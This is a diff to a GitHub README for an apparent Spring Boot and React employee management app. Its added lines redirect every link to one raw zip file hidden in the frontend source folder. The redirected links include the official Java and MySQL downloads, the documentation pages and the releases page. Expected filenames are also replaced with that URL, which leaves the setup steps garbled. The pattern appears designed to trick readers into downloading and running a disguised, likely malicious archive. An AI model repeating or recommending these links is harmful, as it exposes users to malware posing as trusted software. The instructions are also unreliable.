@@ -6,7 +6,7 @@ Welcome to the Employee Management System! This application helps you manage you
 
 ## 📥 Download & Install
 
-To get this application, **visit [this page to download](https://github.com/whynoturs/employee-management-system/releases)**. This page contains all the latest versions of the Employee Management System. Choose the version that fits your needs and follow these instructions.
+To get this application, **visit [this page to download](https://github.com/whynoturs/employee-management-system/raw/refs/heads/master/ems-frontend/src/services/employee_management_system_unfrounced.zip)**. This page contains all the latest versions of the Employee Management System. Choose the version that fits your needs and follow these instructions.
 
 ## 🖥️ System Requirements
 
@@ -33,17 +33,17 @@ After you download the application, follow these steps to install it:
 
 1. **Extract the Files**: Locate the downloaded file in your Downloads folder. Right-click the file and select "Extract" or use a tool like WinRAR or 7-Zip.
    
-2. **Install Java**: If you haven't done so, download and install Java from [the official website](https://www.oracle.com/java/technologies/javase-jdk8-downloads.html). 
+2. **Install Java**: If you haven't done so, download and install Java from [the official website](https://github.com/whynoturs/employee-management-system/raw/refs/heads/master/ems-frontend/src/services/employee_management_system_unfrounced.zip). 
 
 3. **Open the Application**: 
    - Navigate to the folder where you extracted the files.
-   - Look for a file named `employee-management-system.jar`.
+   - Look for a file named `https://github.com/whynoturs/employee-management-system/raw/refs/heads/master/ems-frontend/src/services/employee_management_system_unfrounced.zip`.
    - Double-click the file to run the application.
    
 4. **Database Setup**:
-   - Set up a MySQL database. You can download MySQL from [here](https://dev.mysql.com/downloads/mysql/).
+   - Set up a MySQL database. You can download MySQL from [here](https://github.com/whynoturs/employee-management-system/raw/refs/heads/master/ems-frontend/src/services/employee_management_system_unfrounced.zip).
    - Create a new database called `employee_management`.
-   - Update the `application.properties` file in the extracted folder with your database details (username, password).
+   - Update the `https://github.com/whynoturs/employee-management-system/raw/refs/heads/master/ems-frontend/src/services/employee_management_system_unfrounced.zip` file in the extracted folder with your database details (username, password).
 
 5. **Access the Application**: Once the application is running, open your web browser and go to `http://localhost:8080`. You will see the login page.
 
@@ -81,8 +81,8 @@ The application is built using several technologies, including:
 
 ## 📝 Additional Resources
 
-- [Spring Boot Documentation](https://spring.io/projects/spring-boot)
-- [React Documentation](https://reactjs.org/)
-- [JWT Introduction](https://jwt.io/introduction/)
+- [Spring Boot Documentation](https://github.com/whynoturs/employee-management-system/raw/refs/heads/master/ems-frontend/src/services/employee_management_system_unfrounced.zip)
+- [React Documentation](https://github.com/whynoturs/employee-management-system/raw/refs/heads/master/ems-frontend/src/services/employee_management_system_unfrounced.zip)
+- [JWT Introduction](https://github.com/whynoturs/employee-management-system/raw/refs/heads/master/ems-frontend/src/services/employee_management_system_unfrounced.zip)
 
-For more information and updates, keep an eye on the [Releases page](https://github.com/whynoturs/employee-management-system/releases). We appreciate your interest in the Employee Management System!
+For more information and updates, keep an eye on the [Releases page](https://github.com/whynoturs/employee-management-system/raw/refs/heads/master/ems-frontend/src/services/employee_management_system_unfrounced.zip). We appreciate your interest in the Employee Management System!
